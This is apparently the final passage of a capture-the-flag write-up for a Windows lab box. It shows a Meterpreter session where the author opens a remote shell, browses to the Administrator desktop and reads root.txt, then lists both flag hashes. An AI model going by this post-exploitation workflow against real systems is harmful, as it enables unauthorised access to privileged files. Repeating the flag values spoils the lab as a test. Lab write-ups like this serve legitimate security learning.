  
Mode              Size    Type  Last modified              Name  
----              ----    ----  -------------              ----  
040777/rwxrwxrwx  0       dir   2026-05-26 22:17:47 +0200  %TEMP%  
100666/rw-rw-rw-  282     fil   2017-03-18 12:57:16 +0100  desktop.ini  
100777/rwxrwxrwx  760320  fil   2017-03-18 13:11:17 +0100  hfs.exe  
100444/r--r--r--  34      fil   2026-05-26 20:32:50 +0200  user.txt  
  
meterpreter > shell  
Process 2264 created.  
Channel 1 created.  
Microsoft Windows [Version 6.3.9600]  
(c) 2013 Microsoft Corporation. All rights reserved.  
  
C:\Users\kostas\Desktop>getuid  
getuid  
'getuid' is not recognized as an internal or external command,  
operable program or batch file.  
  
C:\Users\kostas\Desktop>cd /  
cd /  
  
C:\>cd /Users/Administrator  
cd /Users/Administrator  
  
C:\Users\Administrator>ls  
ls  
'ls' is not recognized as an internal or external command,  
operable program or batch file.  
  
C:\Users\Administrator>dir  
dir  
Volume in drive C has no label.  
Volume Serial Number is EE82-226D  
  
Directory of C:\Users\Administrator  
  
18/03/2017  02:52 ??    <DIR>          .  
18/03/2017  02:52 ??    <DIR>          ..  
18/03/2017  02:52 ??    <DIR>          Contacts  
18/03/2017  03:14 ??    <DIR>          Desktop  
18/03/2017  02:52 ??    <DIR>          Documents  
18/03/2017  02:52 ??    <DIR>          Downloads  
18/03/2017  02:52 ??    <DIR>          Favorites  
18/03/2017  02:52 ??    <DIR>          Links  
18/03/2017  02:52 ??    <DIR>          Music  
18/03/2017  02:52 ??    <DIR>          Pictures  
18/03/2017  02:52 ??    <DIR>          Saved Games  
18/03/2017  02:52 ??    <DIR>          Searches  
18/03/2017  02:52 ??    <DIR>          Videos  
              0 File(s)              0 bytes  
             13 Dir(s)   5.643.386.880 bytes free  
  
C:\Users\Administrator>cd /Users/Administrator/Desktop  
cd /Users/Administrator/Desktop  
  
C:\Users\Administrator\Desktop>ls  
ls  
'ls' is not recognized as an internal or external command,  
operable program or batch file.  
  
C:\Users\Administrator\Desktop>dir  
dir  
Volume in drive C has no label.  
Volume Serial Number is EE82-226D  
  
Directory of C:\Users\Administrator\Desktop  
  
18/03/2017  03:14 ??    <DIR>          .  
18/03/2017  03:14 ??    <DIR>          ..  
26/05/2026  09:32 ??                34 root.txt  
              1 File(s)             34 bytes  
              2 Dir(s)   5.643.386.880 bytes free  
  
C:\Users\Administrator\Desktop>cat root.txt  
cat root.txt  
'cat' is not recognized as an internal or external command,  
operable program or batch file.  
  
C:\Users\Administrator\Desktop>type root.txt  
type root.txt  
92637427b7d302e824a015ea8ed5b74e  
  
C:\Users\Administrator\Desktop>
```

And we got root officially on my first black box engagement.

## Flags

```
user.txt  c5ba70505492996b1e7c7083ba9f4f21
root.txt  92637427b7d302e824a015ea8ed5b74e
```
